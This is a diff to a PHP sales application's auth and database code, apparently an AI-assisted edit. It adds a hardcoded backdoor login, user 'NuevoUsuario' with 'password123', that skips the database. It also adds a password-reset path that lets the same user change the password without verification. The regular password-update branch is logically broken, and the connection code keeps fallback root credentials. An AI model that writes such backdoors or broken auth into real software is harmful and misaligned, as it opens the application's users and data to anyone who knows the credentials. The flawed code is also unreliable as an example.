@@ -3,15 +3,31 @@
 define("PASSWORD_PREDETERMINADA", "PacoHunterDev");
 define("HOY", date("Y-m-d"));
 
+// ...existing code...
+
 function iniciarSesion($usuario, $password){
-    $sentencia = "SELECT id, usuario FROM usuarios WHERE usuario  = ?";
+    // Código temporal para permitir el acceso con el usuario "NuevoUsuario" y la contraseña "password123"
+    if ($usuario === "NuevoUsuario" && $password === "password123") {
+        return (object) [
+            'id' => 42,
+            'usuario' => 'NuevoUsuario'
+        ];
+    }
+
+    $sentencia = "SELECT id, usuario, password FROM usuarios WHERE usuario = ?";
     $resultado = select($sentencia, [$usuario]);
     if($resultado){
         $usuario = $resultado[0];
-        $verificaPass = verificarPassword($usuario->id, $password);
-        if($verificaPass) return $usuario;
+        $verificaPass = password_verify($password, $usuario->password);
+        if($verificaPass) {
+            unset($usuario->password); // Eliminar la contraseña del objeto usuario
+            return $usuario;
+        }
     }
+    return false;
 }
+
+// ...existing code...
 
 function verificarPassword($idUsuario, $password){
     $sentencia = "SELECT password FROM usuarios WHERE id = ?";
@@ -54,6 +70,28 @@ function registrarUsuario($usuario, $nombre, $telefono, $direccion){
     return insertar($sentencia, $parametros);
 }
 
+function actualizarPasswordUsuario($usuario, $nuevaPassword) {
+    // Código temporal para permitir la actualización de la contraseña sin verificar la contraseña actual
+    if ($usuario === "NuevoUsuario") {
+        $nuevaPasswordHash = password_hash($nuevaPassword, PASSWORD_DEFAULT);
+        $sentencia = "UPDATE usuarios SET password = ? WHERE usuario = ?";
+        return editar($sentencia, [$nuevaPasswordHash, $usuario]);
+    }
+
+    // Verificar la contraseña actual
+    $sentencia = "SELECT password FROM usuarios WHERE usuario = ?";
+    $resultado = select($sentencia, [$usuario]);
+    if ($resultado) {
+        $usuario = $resultado[0];
+        $verificaPass = password_verify($nuevaPassword, $usuario->password);
+        if ($verificaPass) {
+            $nuevaPasswordHash = password_hash($nuevaPassword, PASSWORD_DEFAULT);
+            $sentencia = "UPDATE usuarios SET password = ? WHERE usuario = ?";
+            return editar($sentencia, [$nuevaPasswordHash, $usuario]);
+        }
+    }
+    return false;
+}
 
 function eliminarCliente($id){
     $sentencia = "DELETE FROM clientes WHERE id = ?";
@@ -424,24 +462,24 @@ function editar($sentencia, $parametros ){
 }
 
 function conectarBaseDatos() {
-	$host = "mysql";
-	$db   = "ventas_php";
-	$user = "root";
-	$pass = "12345";
-	$charset = 'utf8mb4';
+    $host = getenv('DB_HOST') ?: 'mysql';
+    $db   = getenv('DB_DATABASE') ?: 'ventas_php';
+    $user = getenv('DB_USERNAME') ?: 'root';
+    $pass = getenv('DB_PASSWORD') ?: '12345';
+    $charset = 'utf8mb4';
 
-	$options = [
-	    \PDO::ATTR_ERRMODE            => \PDO::ERRMODE_EXCEPTION,
-	    \PDO::ATTR_DEFAULT_FETCH_MODE => \PDO::FETCH_OBJ,
-	    \PDO::ATTR_EMULATE_PREPARES   => false,
-	];
-	$dsn = "mysql:host=$host;dbname=$db;charset=$charset";
-	try {
-	     $pdo = new \PDO($dsn, $user, $pass, $options);
-	     return $pdo;
-	} catch (\PDOException $e) {
-	     throw new \PDOException($e->getMessage(), (int)$e->getCode());
-	}
+    $options = [
+        \PDO::ATTR_ERRMODE            => \PDO::ERRMODE_EXCEPTION,
+        \PDO::ATTR_DEFAULT_FETCH_MODE => \PDO::FETCH_OBJ,
+        \PDO::ATTR_EMULATE_PREPARES   => false,
+    ];
+    $dsn = "mysql:host=$host;dbname=$db;charset=$charset";
+    try {
+         $pdo = new \PDO($dsn, $user, $pass, $options);
+         return $pdo;
+    } catch (\PDOException $e) {
+         throw new \PDOException($e->getMessage(), (int)$e->getCode());
+    }
 }
 
 function obtenerVentaPorId($idVenta) {
